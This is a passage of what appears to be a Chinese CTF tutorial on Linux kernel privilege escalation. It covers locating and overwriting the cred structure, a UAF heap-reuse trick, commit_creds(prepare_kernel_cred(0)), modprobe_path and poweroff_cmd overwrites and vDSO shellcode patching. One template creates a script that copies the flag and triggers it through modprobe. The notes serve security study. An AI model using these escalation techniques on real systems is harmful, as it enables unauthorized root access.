magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，提权方式为：</p>
<ul>
<li>直接修改 cred 结构体的内容（需要先定位 cred，然后将其修改）</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li>
</ul>
<p><strong>Change Others：</strong></p>
<p>如果我们可以改变特权进程的执行轨迹，也可以实现提权，这里我们从以下角度来考虑如何改变特权进程的执行轨迹：</p>
<ul>
<li>改数据</li>
<li>改代码</li>
</ul>
<h2 id="修改-cred-结构体的内容"><a href="#修改-cred-结构体的内容" class="headerlink" title="修改 cred 结构体的内容"></a>修改 cred 结构体的内容</h2><p>想要修改 cred 结构体，首先需要确定该结构体的位置：</p>
<p><strong>cred定位-直接扫描 cred</strong></p>
<p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份，因此我们可以通过 <strong>扫描内存</strong> 来定位 cred</p>
<ul>
<li>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放</li>
<li>一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred</li>
<li>这是因为 cred 从 usage 为 0， 到释放有一定的时间</li>
<li>此外，cred 是使用 rcu 延迟释放的</li>
</ul>
<p><strong>cred定位-通过task_struct间接定位</strong></p>
<p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以：</p>
<ul>
<li>定位当前进程 <code>task_struct</code> 结构体的地址</li>
<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li>
<li>获取 <code>cred</code> 具体的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> state; <span class="comment">// 说明了该进程是否可以执行,还是可中断等信息</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags; <span class="comment">// Flage 是进程号,在调用fork()时给出</span></span><br><span class="line"><span class="keyword">int</span> sigpending; <span class="comment">// 进程上是否有待处理的信号</span></span><br><span class="line"><span class="keyword">mm_segment_t</span> addr_limit; <span class="comment">// 进程地址空间,区分内核进程与普通进程在内存存放的位置不同</span></span><br><span class="line">    <span class="comment">/* 0-0xBFFFFFFF for user-thead */</span></span><br><span class="line">    <span class="comment">/* 0-0xFFFFFFFF for kernel-thread */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">long</span> need_resched; <span class="comment">// 调度标志,表示该进程是否需要重新调度,若非0,则当从内核态返回到用户态,会发生调度</span></span><br><span class="line"><span class="keyword">int</span> lock_depth; <span class="comment">// 锁深度</span></span><br><span class="line"><span class="keyword">long</span> nice; <span class="comment">// 进程的基本时间片</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> policy; <span class="comment">// 进程的调度策略,有三种,实时进程:SCHED_FIFO,SCHED_RR, 分时进程:SCHED_OTHER</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span> <span class="comment">// 进程内存管理信息</span></span><br><span class="line"><span class="keyword">int</span> processor; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cpus_runnable, cpus_allowed; <span class="comment">// 若进程不在任何CPU上运行, cpus_runnable 的值是0,否则是1(这个值在运行队列被锁时更新)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">run_list</span>;</span> <span class="comment">// 指向运行队列的指针</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sleep_time; <span class="comment">// 进程的睡眠时间</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next_task</span>, *<span class="title">prev_task</span>;</span> <span class="comment">// 用于将系统中所有的进程连成一个双向循环链表,其根是init_task</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">active_mm</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">local_pages</span>;</span> <span class="comment">// 指向本地页面      </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> allocation_order, nr_local_pages;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span> <span class="comment">// 进程所运行的可执行文件的格式</span></span><br><span class="line"><span class="keyword">int</span> exit_code, exit_signal;</span><br><span class="line"><span class="keyword">int</span> pdeath_signal; <span class="comment">// 父进程终止时向子进程发送的信号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> personality;</span><br><span class="line"><span class="keyword">int</span> did_exec:<span class="number">1</span>; <span class="comment">// Linux可以运行由其他UNIX操作系统生成的符合iBCS2标准的程序</span></span><br><span class="line"><span class="keyword">pid_t</span> pid;				<span class="comment">/* 进程标识符,用来代表一个进程 */</span></span><br><span class="line"><span class="keyword">pid_t</span> pgrp;				<span class="comment">/* 进程组标识,表示进程所属的进程组 */</span></span><br><span class="line"><span class="keyword">pid_t</span> tty_old_pgrp;		<span class="comment">/* 进程控制终端所在的组标识 */</span></span><br><span class="line"><span class="keyword">pid_t</span> session;  		<span class="comment">/* 进程的会话标识 */</span></span><br><span class="line"><span class="keyword">pid_t</span> tgid;</span><br><span class="line"><span class="keyword">int</span> leader; <span class="comment">// 表示进程是否为会话主管</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p_opptr</span>,*<span class="title">p_pptr</span>,*<span class="title">p_cptr</span>,*<span class="title">p_ysptr</span>,*<span class="title">p_osptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">thread_group</span>;</span> <span class="comment">// 线程链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pidhash_next</span>;</span> <span class="comment">// 用于将进程链入HASH表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> **<span class="title">pidhash_pprev</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> wait_chldexit; <span class="comment">// 供wait4()使用</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">vfork_done</span>;</span> <span class="comment">// 供vfork()使用</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rt_priority; <span class="comment">// 实时优先级，用它计算实时进程调度时的weight值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* it_real_value,it_real_incr用于REAL定时器(单位为jiffies):</span></span><br><span class="line"><span class="comment">系统根据it_real_value设置定时器的第一个终止时间,在定时器到期时,向进程发送SIGALRM信号,同时根据it_real_incr重置终止时间 */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* it_prof_value，it_prof_incr用于Profile定时器(单位为jiffies):</span></span><br><span class="line"><span class="comment">当进程运行时,不管在何种状态下,每个tick都使it_prof_value值减一,当减到0时,向进程发送</span></span><br><span class="line"><span class="comment">信号SIGPROF,并根据it_prof_incr重置时间 */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* it_virt_value,it_virt_value用于Virtual定时器(单位为jiffies):</span></span><br><span class="line"><span class="comment">当进程运行时,不管在何种状态下,每个tick都使it_virt_value值减一,当减到0时,向进程发送信号SIGVTALRM,根据it_virt_incr重置初值 */</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> it_real_value, it_prof_value, it_virt_value;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> it_real_incr, it_prof_incr, it_virt_value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">real_timer</span>;</span> <span class="comment">// 指向实时定时器的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tms</span> <span class="title">times</span>;</span> <span class="comment">// 记录进程消耗的时间</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start_time; <span class="comment">// 进程创建的时间</span></span><br><span class="line"><span class="keyword">long</span> per_cpu_utime[NR_CPUS], per_cpu_stime[NR_CPUS]; <span class="comment">// 记录进程在每个CPU上所消耗的用户态时间和核心态时间</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 内存缺页和交换信息:</span></span><br><span class="line"><span class="comment">min_flt,maj_flt:累计进程的次缺页数(Copy on　Write页和匿名页)和主缺页数(从映射文件或交换</span></span><br><span class="line"><span class="comment">设备读入的页面数)</span></span><br><span class="line"><span class="comment">nswap:记录进程累计换出的页面数,即写到交换设备上的页面数</span></span><br><span class="line"><span class="comment">cmin_flt,cmaj_flt,cnswap:记录本进程为祖先的所有子孙进程的累计次缺页数,主缺页数和换出页面数,在父进程回收终止的子进程时,父进程会将子进程的这些信息累计到自己结构的这些域中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_flt, maj_flt, nswap, cmin_flt, cmaj_flt, cnswap;</span><br><span class="line"><span class="keyword">int</span> swappable:<span class="number">1</span>; <span class="comment">// 表示进程的虚拟地址空间是否允许换出</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 进程认证信息:</span></span><br><span class="line"><span class="comment">uid,gid:为运行该进程的用户的用户标识符和组标识符,通常是进程创建者的uid,gid</span></span><br><span class="line"><span class="comment">euid,egid:为有效uid,gid</span></span><br><span class="line"><span class="comment">fsuid,fsgid:为文件系统uid,gid,这两个ID号通常与有效uid,gid相等,在检查对于文件系统的访问权限时使用他们</span></span><br><span class="line"><span class="comment">suid,sgid:为备份uid,gid</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">uid_t</span> uid,euid,suid,fsuid;</span><br><span class="line"><span class="keyword">gid_t</span> gid,egid,sgid,fsgid;</span><br><span class="line"><span class="keyword">int</span> ngroups; <span class="comment">// 记录进程在多少个用户组中</span></span><br><span class="line"><span class="keyword">gid_t</span> groups[NGROUPS]; <span class="comment">// 记录进程所在的组</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span> cap_effective, cap_inheritable, cap_permitted; <span class="comment">// 进程的权能,分别是有效位集合,继承位集合,允许位集合</span></span><br><span class="line"><span class="keyword">int</span> keep_capabilities:<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>[<span class="title">RLIM_NLIMITS</span>];</span> <span class="comment">// 与进程相关的资源限制信息</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> used_math; <span class="comment">// 是否使用FPU</span></span><br><span class="line"><span class="keyword">char</span> comm[<span class="number">16</span>]; <span class="comment">// 进程正在运行的可执行文件名</span></span><br><span class="line"><span class="keyword">int</span> link_count, total_link_count; <span class="comment">// 文件系统信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span> <span class="comment">// 指向进程所在的控制终端,如果不需要控制终端,则该指针为空</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> locks;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sem_undo</span> *<span class="title">semundo</span>;</span> <span class="comment">// 进程在信号灯上的所有undo操作</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sem_queue</span> *<span class="title">semsleeping</span>;</span> <span class="comment">// 当进程因为信号灯操作而挂起时,他在该队列中记录等待的操作</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> <span class="title">thread</span>;</span> <span class="comment">// 进程的CPU状态,切换时,要保存到停止进程的task_struct中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span> <span class="comment">// 文件系统信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span> <span class="comment">// 打开文件信息</span></span><br><span class="line"><span class="keyword">spinlock_t</span> sigmask_lock; <span class="comment">// 信号处理函数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">sig</span>;</span> <span class="comment">// 信号处理函数</span></span><br><span class="line"><span class="keyword">sigset_t</span> blocked; <span class="comment">// 进程当前要阻塞的信号,每个信号对应一位</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span> <span class="comment">// 进程上是否有待处理的信号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sas_ss_sp;</span><br><span class="line"><span class="keyword">size_t</span> sas_ss_size;</span><br><span class="line"><span class="keyword">int</span> (*notifier)(<span class="keyword">void</span> *priv);</span><br><span class="line"><span class="keyword">void</span> *notifier_data;</span><br><span class="line"><span class="keyword">sigset_t</span> *notifier_mask;</span><br><span class="line">u32 parent_exec_id;</span><br><span class="line">u32 self_exec_id;</span><br><span class="line"><span class="keyword">spinlock_t</span> alloc_lock;</span><br><span class="line"><span class="keyword">void</span> *journal_info;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>cred定位-通过comm间接定位</strong></p>
<p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中，我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率，因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm</p>
<p><strong>cred间接定位-UAF使用同样堆块</strong></p>
<p>虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可</p>
<p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的，这里给出一个典型的例子：</p>
<ul>
<li>申请一块与 cred 结构体大小一样的堆块</li>
<li>释放该堆块</li>
<li>fork 出新进程，恰好使用刚刚释放的堆块</li>
<li>此时，修改 cred 结构体特定内存，从而提权</li>
</ul>
<p><strong>cred修改</strong></p>
<p>在具体修改时，我们可以使用如下方式：</p>
<ul>
<li>修改 cred 指针为内核镜像中已有的 init_cred 的地址（这种方法适合于我们能够直接修改 cred 指针以及知道 init_cred 地址的情况）</li>
<li>伪造一个 cred，然后修改 cred 指针指向该地址即可（这种方式比较麻烦，一般并不使用）</li>
<li>使用 commit_creds(prepare_kernel_cred(0)) 来进行提权，该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred（该方式比较适用于控制程序执行流后使用，例如ROP后）</li>
</ul>
<h2 id="改变特权进程的执行轨迹"><a href="#改变特权进程的执行轨迹" class="headerlink" title="改变特权进程的执行轨迹"></a>改变特权进程的执行轨迹</h2><p>如果我们可以改变特权进程的执行轨迹，也可以实现提权，这里我们从以下角度来考虑如何改变特权进程的执行轨迹：改数据，改代码</p>
<p><strong>改数据-符号链接</strong></p>
<p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权</p>
<p><strong>改数据-利用 call_usermodehelper</strong></p>
<p>修改 modprobe_path 实现提权的基本流程如下：</p>
<ul>
<li>获取 modprobe_path 的地址</li>
<li>修改 modprobe_path 为指定的程序（当前进程）</li>
<li>触发执行 <code>call_modprobe</code>，从而实现提权 ，这里我们可以利用以下几种方式来触发：<ul>
<li>执行一个非法的可执行文件，非法的可执行文件需要满足相应的要求</li>
<li>使用未知协议来触发</li>
</ul>
</li>
</ul>
<p>使用 modprobe_path 的模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1: 将modprobe_path修改为目标值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2: 创建相关文件</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3.1: 使用未知的可执行文件触发它</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3.2: 使用未知协议触发它</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 modprobe_path 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串，这需要我们具有扫描内存的能力</li>
<li>考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址</li>
</ul>
<p><strong>改数据-修改 poweroff_cmd</strong></p>
<ul>
<li>获取 poweroff_cmd 的地址</li>
<li>修改 poweroff_cmd 为指定的程序（当前进程）</li>
<li>劫持控制流执行 <code>__orderly_poweroff</code></li>
</ul>
<p>关于如何定位 <code>poweroff_cmd</code>，我们可以采用类似于定位 <code>modprobe_path</code> 的方法</p>
<p><strong>改代码-修改 vDSO 代码</strong></p>
<p>内核中 vDSO 的代码会被映射到所有的用户态进程中，如果有一个高特权的进程会周期性地调用 vDSO 中的函数，那我们可以考虑把 vDSO 中相应的函数修改为特定的 shellcode，当高权限的进程执行相应的代码时，我们就可以进行提权</p>
<ul>
<li>在早期的时候，Linux 中的 vDSO 是可写的，考虑到这样的风险，Kees Cook 提出引入 <code>post-init read-only</code> 的数据，即将那些初始化后不再被写的数据标记为只读，来防御这样的利用</li>
</ul>
<p>通过修改 vDSO 进行提权的基本方式如下：</p>
<ul>
<li>定位 vDSO（IDA中查看为：raw_data）</li>
<li>修改 vDSO 的特定函数为指定的 shellcode</li>
<li>等待触发执行 shellcode</li>
</ul>
<p>这里我们着重关注下如何定位 vDSO：</p>
<p>在 IDA 中定位：</p>
<ul>
<li>在 ida 里定位 init_vdso 函数的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_vdso</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_vdso_image(&amp;vdso_image_64 + <span class="number">0x20000000</span>);</span><br><span class="line">  init_vdso_image(&amp;vdso_image_x32 + <span class="number">0x20000000</span>);</span><br><span class="line">  cpu_maps_update_begin();</span><br><span class="line">  on_each_cpu((<span class="keyword">char</span> *)startup_64 + <span class="number">0x100003EA0</span>LL, <span class="number">0LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  _register_cpu_notifier(&amp;sdata + <span class="number">536882764</span>);</span><br><span class="line">  cpu_maps_update_done();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进入“vdso_image_64”或者“vdso_image_x32”后，就可以看到“raw_data”了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:FFFFFFFF81A01300                 <span class="keyword">public</span> vdso_image_64</span><br><span class="line">.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+<span class="number">18</span>↑o</span><br><span class="line">.rodata:FFFFFFFF81A01300                                         ; init_vdso+<span class="number">1</span>↓o</span><br></pre></td></tr></table></figure>
<p>在内存中定位：</p>
<ul>
<li>vDSO 其实是一个 ELF 文件，具有 ELF 文件头，同时，vDSO 中特定位置存储着导出函数的字符串，因此我们可以根据这两个特征来扫描内存，定位 vDSO 的位置</li>
<li>考虑到 vDSO 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 vDSO 的地址</li>
</ul>
<h2 id="Kernel-目录结构"><a href="#Kernel-目录结构" class="headerlink" title="Kernel 目录结构"></a>Kernel 目录结构</h2><p>通常一个文件系统映像（core.cpio）解压以后有如下目录/文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  core ls</span><br><span class="line">bin      etc  init     lib64   proc  sbin  tmp  vmlinux</span><br><span class="line">core.ko  lib  linuxrc  root    sys   usr</span><br></pre></td></tr></table></figure>
<ul>
<li>bin目录：普通用户使用的二进制文件，包括了各种终端命令</li>
<li>sbin目录：超级用户专用的二进制代码存放目录，主要用于系统管理</li>
<li><p>usr目录：usr 是 unix shared resources(共享资源) 的缩写，用户的很多应用程序和文件都放在这个目录下</p>
<ul>
<li>/usr/bin：普通用户在后期安装的一些软件的运行脚本</li>
<li>/usr/sbin：存放了超级用户使用的，对于boot启动时非必须的二进制程序文件</li>
</ul>
</li>
<li>etc目录：配置文件目录 </li>
<li>sys目录：包含硬件设备的驱动程序信息（一般为NULL）</li>
<li>proc文件：proc虚拟文件系统在内核空间和用户空间之间打开了一个通信窗口（一般为NULL）</li>
<li>init文件：初始化脚本（拥有关键信息）</li>
<li>lib64目录：包含大量库文件（通常 lib32，lib64 只会有一个，而 lib 是其中一个的符号链接）</li>
<li>lib目录：包含基本的共享库和内核模块，arch(架构)，drivers(驱动)，fs(文件系统)，net(网络)</li>
<li>tmp目录：用于存放临时文件（一般为NULL）</li>
<li>vmlinux文件：静态链接的可执行文件格式的 Linux 内核，分析的目标之一</li>
<li>core.ko文件：驱动文件，分析的目标之一（文件名可能不是“core”，主要看这个“ko”后缀）</li>
<li>linuxrc链接：链接目标 [bin/busybox]</li>
<li>root目录：root用户使用的目录，通常装有“flag”</li>
</ul>
<h2 id="驱动函数"><a href="#驱动函数" class="headerlink" title="驱动函数"></a>驱动函数</h2><p>当我们用 IDA 分析一个驱动文件时，会得到以下函数：</p>
<img src="/2022/05/09/Kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1652275165959-1664718736208.png" class width="1652275165959"> 
<p>这些函数就是驱动函数，也被称为 ioctl 函数：</p>
<ul>
<li>ioctl 是设备驱动程序中对设备的 I/O 通道进行管理的函数</li>
<li>ioctl 函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对 ioctl 的支持，用户就可以在用户程序中使用 ioctl 函数控制设备的 I/O 通道</li>
<li>在驱动程序中实现的 ioctl 函数体内，实际上是有一个 switch{case} 结构，每一个 case 对应一个命令码，做出一些相应的操作，怎么实现这些操作，这是由每一个程序员自己控制的，因为设备都是特定的</li>
</ul>
<p>驱动函数是 kernel 中容易出问题的点，是该重点分析的对象</p>
